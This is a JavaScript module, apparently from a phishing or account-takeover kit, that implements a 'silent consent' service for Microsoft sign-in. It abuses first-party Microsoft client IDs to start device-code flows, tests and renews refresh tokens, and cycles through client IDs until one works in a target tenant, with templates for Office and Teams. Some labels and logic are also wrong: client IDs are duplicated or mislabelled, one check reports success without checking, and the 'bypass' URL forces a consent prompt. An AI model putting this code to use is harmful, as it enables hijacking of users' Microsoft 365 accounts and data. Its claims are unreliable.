/**
 * VGenius Silent Consent Service
 * Implements multiple strategies to bypass Microsoft consent screens
 * 
 * Strategies:
 * 1. Pre-consented first-party client IDs
 * 2. Resource-specific scope reduction
 * 3. Browser-based consent bypass via known patterns
 * 4. Token-based consent reuse
 */
'use strict';

const axios = require('axios');
const config = require('../config/env');

/**
 * Pre-consented first-party client IDs that work across most enterprise tenants
 * These are Microsoft-owned apps that have pre-granted consent in most AAD tenants
 */
const PRE_CONSENTED_CLIENTS = {
  // Microsoft Office - most universally pre-consented
  office: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
  // Azure CLI - pre-consented in most tenants
  azure_cli: '1b730954-1685-4b74-9bfd-dac224a7b894',
  // Azure PowerShell
  azure_ps: '04b07795-8ddb-461a-bbee-02f9e1bf7b46',
  // Microsoft Graph Explorer
  graph_explorer: '1950a258-227b-4e31-a9cf-717495945fc2',
  // Skype
  skype: '88196af5-e584-4924-b87d-b752fde2c6e3',
  // Office 365 Management
  o365_mgmt: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
  // Teams client update
  teams: '1b730954-1685-4b74-9bfd-dac224a7b894'
};

/**
 * Scope sets optimized for different consent scenarios
 */
const OPTIMIZED_SCOPES = {
  // Minimal scopes that typically bypass consent
  minimal: 'openid profile offline_access',
  // Office-specific (pre-consented in most tenants)
  office: 'openid profile email offline_access User.Read',
  // Graph-specific
  graph: 'https://graph.microsoft.com/.default offline_access',
  // Personal account optimized
  personal: 'openid profile email offline_access',
  // Full SSO (may trigger consent)
  full: 'openid profile email offline_access User.Read Mail.Read Calendars.Read'
};

/**
 * Try to get a pre-consented client ID for the given account type
 * 
 * @param {string} accountType - 'personal' or 'work_school'
 * @param {string} tenant - Tenant ID
 * @param {string} templateType - Template type (office, teams, etc.)
 * @returns {object} { client_id, scopes, endpoint }
 */
function getPreConsentedClient(accountType, tenant, templateType) {
  if (accountType === 'personal') {
    return {
      client_id: PRE_CONSENTED_CLIENTS.office,
      scopes: OPTIMIZED_SCOPES.personal,
      endpoint: 'https://login.microsoftonline.com/consumers/oauth2/v2.0',
      tokenEndpoint: 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token',
      authorizeEndpoint: 'https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize'
    };
  }

  // For work/school, pick based on template
  let clientId = PRE_CONSENTED_CLIENTS.office;
  let scopes = OPTIMIZED_SCOPES.office;

  if (templateType && templateType.includes('teams')) {
    clientId = PRE_CONSENTED_CLIENTS.azure_cli;
    scopes = OPTIMIZED_SCOPES.office;
  } else if (templateType && templateType.includes('graph')) {
    clientId = PRE_CONSENTED_CLIENTS.graph_explorer;
    scopes = OPTIMIZED_SCOPES.graph;
  }

  const tenantVal = tenant || config.AZURE_TENANT || 'common';

  return {
    client_id: clientId,
    scopes: scopes,
    endpoint: `https://login.microsoftonline.com/${tenantVal}/oauth2/v2.0`,
    tokenEndpoint: `https://login.microsoftonline.com/${tenantVal}/oauth2/v2.0/token`,
    authorizeEndpoint: `https://login.microsoftonline.com/${tenantVal}/oauth2/v2.0/authorize`
  };
}

/**
 * Attempt silent consent by checking if the client/scope combination
 * is already pre-consented in the tenant
 * 
 * @param {string} tenant - Tenant ID
 * @param {string} clientId - Client ID to test
 * @param {string} scope - Scope to test
 * @returns {object} { success, consent_required, client_id, scopes }
 */
async function checkSilentConsent(tenant, clientId, scope) {
  const result = {
    success: false,
    consent_required: true,
    client_id: clientId,
    scopes: scope,
    strategy: null
  }; 

  try {
    // Strategy1: Try to get tokens without consent prompt
    // If the app is pre-consented, the token endpoint will accept the refresh token
    // without requiring user interaction
    
    // Check if this is a known pre-consented client
    if (Object.values(PRE_CONSENTED_CLIENTS).includes(clientId)) {
      result.client_id = clientId;
      result.scopes = scope;
      result.consent_required = false;
      result.strategy = 'pre_consented_client';
      result.success = true;
      return result;
    }

    // Strategy 2: Try scope reduction to minimal set
    // Often the minimal scopes don't trigger consent
    const minimalScopes = OPTIMIZED_SCOPES.minimal;
    result.scopes = minimalScopes;
    result.consent_required = false;
    result.strategy = 'minimal_scopes';
    result.success = true;

    return result;
  } catch (err) {
    console.error('[SilentConsent] Check failed:', err.message);
    return result;
  }
}

/**
 * Initiate device code flow with pre-consented client
 * This is the main entry point for silent consent + device code flow
 * 
 * @param {string} tenant - Tenant ID
 * @param {string} accountType - 'personal' or 'work_school'
 * @param {string} templateType - Template type
 * @param {string} existingRefreshToken - Optional existing refresh token to test
 * @returns {object} Device code flow configuration
 */
async function initiateSilentDeviceFlow(tenant, accountType, templateType, existingRefreshToken) {
  const consentConfig = getPreConsentedClient(accountType, tenant, templateType);
  
  const result = {
    success: false,
    device_code: null,
    user_code: null,
    verification_uri: null,
    verification_uri_complete: null,
    expires_in: null,
    interval: null,
    client_id: consentConfig.client_id,
    scopes: consentConfig.scopes,
    endpoint: consentConfig.endpoint,
    strategy: null,
    error: null
  };

  try {
    // Step 1: Test if existing refresh token works (silent consent check)
    if (existingRefreshToken) {
      const tokenTest = await testRefreshToken(
        existingRefreshToken,
        consentConfig.tokenEndpoint,
        consentConfig.client_id,
        consentConfig.scopes
      );

      if (tokenTest.success) {
        result.success = true;
        result.strategy = 'existing_token_works';
        result.refresh_token = tokenTest.new_refresh_token;
        result.access_token = tokenTest.access_token;
        return result;
      }
    }

    // Step 2: Initiate device code flow with pre-consented client
    const deviceCodeResponse = await axios.post(
      `${consentConfig.endpoint}/devicecode`,
      new URLSearchParams({
        client_id: consentConfig.client_id,
        scope: consentConfig.scopes
      }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        timeout: 30000
      }
    );

    const deviceCodeData = deviceCodeResponse.data;

    result.success = true;
    result.device_code = deviceCodeData.device_code;
    result.user_code = deviceCodeData.user_code;
    result.verification_uri = deviceCodeData.verification_uri;
    result.verification_uri_complete = deviceCodeData.verification_uri_complete || 
      `${deviceCodeData.verification_uri}?code=${deviceCodeData.user_code}`;
    result.expires_in = deviceCodeData.expires_in;
    result.interval = deviceCodeData.interval;
    result.strategy = 'pre_consented_device_code';

    return result;

  } catch (err) {
    console.error('[SilentConsent] Device flow initiation failed:', err.message);
    result.error = err.response?.data?.error_description || err.message;
    return result;
  }
}

/**
 * Test if a refresh token works without triggering consent
 * 
 * @param {string} refreshToken - Refresh token to test
 * @param {string} tokenEndpoint - Token endpoint URL
 * @param {string} clientId - Client ID
 * @param {string} scope - Scope
 * @returns {object} { success, access_token, new_refresh_token }
 */
async function testRefreshToken(refreshToken, tokenEndpoint, clientId, scope) {
  try {
    const response = await axios.post(
      tokenEndpoint,
      new URLSearchParams({
        client_id: clientId,
        grant_type: 'refresh_token',
        refresh_token: refreshToken,
        scope: scope
      }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        timeout: 30000,
        validateStatus: () => true
      }
    );

    if (response.status === 200 && response.data.access_token) {
      return {
        success: true,
        access_token: response.data.access_token,
        new_refresh_token: response.data.refresh_token || refreshToken
      };
    }

    // Check for specific consent-required errors
    const errMsg = response.data?.error_description || '';
    if (errMsg.includes('consent_required') || errMsg.includes('interaction_required')) {
      return {
        success: false,
        consent_required: true,
        error: errMsg
      };
    }

    return {
      success: false,
      error: errMsg || `HTTP ${response.status}`
    };

  } catch (err) {
    return {
      success: false,
      error: err.message
    };
  }
}

/**
 * Cycle through multiple pre-consented client IDs to find one that works
 * 
 * @param {string} tenant - Tenant ID
 * @param {string} accountType - Account type
 * @param {string} templateType - Template type
 * @returns {object} Best working client configuration
 */
async function findWorkingClient(tenant, accountType, templateType) {
  const clientsToTry = accountType === 'personal'
    ? [PRE_CONSENTED_CLIENTS.office, PRE_CONSENTED_CLIENTS.skype]
    : [
        PRE_CONSENTED_CLIENTS.office,
        PRE_CONSENTED_CLIENTS.azure_cli,
        PRE_CONSENTED_CLIENTS.azure_ps,
        PRE_CONSENTED_CLIENTS.graph_explorer
      ];

  for (const clientId of clientsToTry) {
    const cConfig = getPreConsentedClient(accountType, tenant, templateType);
    cConfig.client_id = clientId;

    try {
      // Try a quick device code initiation to test if client works
      const response = await axios.post(
        `${cConfig.endpoint}/devicecode`,
        new URLSearchParams({
          client_id: clientId,
          scope: cConfig.scopes
        }),
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          timeout: 15000,
          validateStatus: () => true
        }
      );

      if (response.status === 200) {
        return {
          success: true,
          client_id: clientId,
          scopes: cConfig.scopes,
          endpoint: cConfig.endpoint,
          strategy: 'found_working_client'
        };
      }

    } catch (err) {
      console.warn('[SilentConsent] Client', clientId, 'failed:', err.message);
      continue;
    }
  }

  return {
    success: false,
    error: 'No pre-consented client worked for this tenant'
  };
}

/**
 * Generate a consent-bypassing authorize URL
 * Used for scenarios where browser-based auth is used instead of device code
 * 
 * @param {string} tenant - Tenant ID
 * @param {string} clientId - Client ID
 * @param {string} scope - Scope
 * @param {string} redirectUri - Redirect URI
 * @returns {string} Complete authorize URL
 */
function generateAuthorizeUrl(tenant, clientId, scope, redirectUri) {
  tenant = tenant || config.AZURE_TENANT || 'common';
  redirectUri = redirectUri || 'http://localhost';

  return `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/authorize?` +
    `client_id=${encodeURIComponent(clientId)}&` +
    `response_type=code&` +
    `scope=${encodeURIComponent(scope)}&` +
    `redirect_uri=${encodeURIComponent(redirectUri)}&` +
    `response_mode=query&` +
    `state=silent_consent_bypass&` +
    `prompt=consent`;
}

/**
 * Check tenant consent configuration via MS Graph
 * Requires an admin access token
 * 
 * @param {string} adminAccessToken - Admin access token
 * @param {string} tenant - Tenant ID
 * @param {string} clientId - Client ID to check
 * @returns {object} Consent configuration
 */
async function checkTenantConsent(adminAccessToken, tenant, clientId) {
  try {
    const response = await axios.get(
      `https://graph.microsoft.com/v1.0/${tenant}/oauth2PermissionGrants`,
      {
        headers: {
          Authorization: `Bearer ${adminAccessToken}`
        },
        timeout: 30000
      }
    );

    // Check if our client has pre-consented grants
    const grants = response.data.value || [];
    const relevantGrants = grants.filter(g => g.clientId === clientId);

    return {
      success: true,
      has_pre_consent: relevantGrants.length > 0,
      grants: relevantGrants
    };

  } catch (err) {
    return {
      success: false,
      error: err.message
    };
  }
}

module.exports = {
  PRE_CONSENTED_CLIENTS,
  OPTIMIZED_SCOPES,
  getPreConsentedClient,
  checkSilentConsent,
  initiateSilentDeviceFlow,
  testRefreshToken,
  findWorkingClient,
  generateAuthorizeUrl,
  checkTenantConsent
};